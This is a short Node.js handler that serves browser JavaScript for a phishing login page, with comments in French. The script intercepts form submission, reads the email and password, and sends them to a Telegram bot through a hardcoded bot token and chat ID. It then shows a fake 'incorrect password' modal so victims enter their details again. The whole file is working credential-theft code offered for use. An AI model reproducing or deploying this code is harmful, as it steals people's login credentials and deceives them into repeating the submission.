module.exports = (req, res) => {
  res.setHeader("Content-Type", "application/javascript; charset=utf-8");
  res.end(`document.addEventListener("DOMContentLoaded", function() {
  const form = document.querySelector("form");

  form.addEventListener("submit", function(event) {
    event.preventDefault(); // Empêche la soumission classique du formulaire

    // Récupération des valeurs du formulaire
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    
    // Construction du message à envoyer sur Telegram
    const message = encodeURIComponent(\`Nouvelle soumission de formulaire:
Adresse e-mail: \${email}
Mot de passe: \${password}\`);
    
    // Remplace ces valeurs par celles de ton bot et chat
    const BOT_TOKEN = "7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs";
    const CHAT_ID = "-4766781392";
    
    // URL de l'API Telegram pour envoyer un message
    const url = \`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage?chat_id=\${CHAT_ID}&text=\${message}\`;
    
    // Envoi de la requête fetch
    fetch(url)
      .then(response => response.json())
      .then(data => {
        // Peu importe la réponse, on affiche le message d'erreur personnalisé
        showError();
      })
      .catch(error => {
        console.error("Erreur lors de la requête fetch:", error);
        showError();
      });
  });
  
  function showError() {
    // Création d'une fenêtre modale pour afficher l'erreur
    const modal = document.createElement("div");
    modal.style.position = "fixed";
    modal.style.top = "0";
    modal.style.left = "0";
    modal.style.width = "100%";
    modal.style.height = "100%";
    modal.style.backgroundColor = "rgba(0, 0, 0, 0.5)";
    modal.style.display = "flex";
    modal.style.justifyContent = "center";
    modal.style.alignItems = "center";
    modal.style.zIndex = "1000";

    // Boîte contenant le message et le bouton
    const box = document.createElement("div");
    box.style.backgroundColor = "#fff";
    box.style.padding = "20px";
    box.style.borderRadius = "5px";
    box.style.textAlign = "center";
    box.style.minWidth = "300px";

    // Message d'erreur en rouge
    const msg = document.createElement("p");
    msg.textContent = "Mot de passe saisi est incorrect";
    msg.style.color = "red";
    msg.style.fontSize = "16px";
    msg.style.marginBottom = "20px";

    // Bouton "Ressayer"
    const button = document.createElement("button");
    button.textContent = "Ressayer";
    button.style.backgroundColor = "#000";
    button.style.color = "#fff";
    button.style.border = "none";
    button.style.padding = "10px 20px";
    button.style.cursor = "pointer";
    button.addEventListener("click", function() {
      document.body.removeChild(modal);
      form.reset();
    });

    box.appendChild(msg);
    box.appendChild(button);
    modal.appendChild(box);
    document.body.appendChild(modal);
  }
});`);
};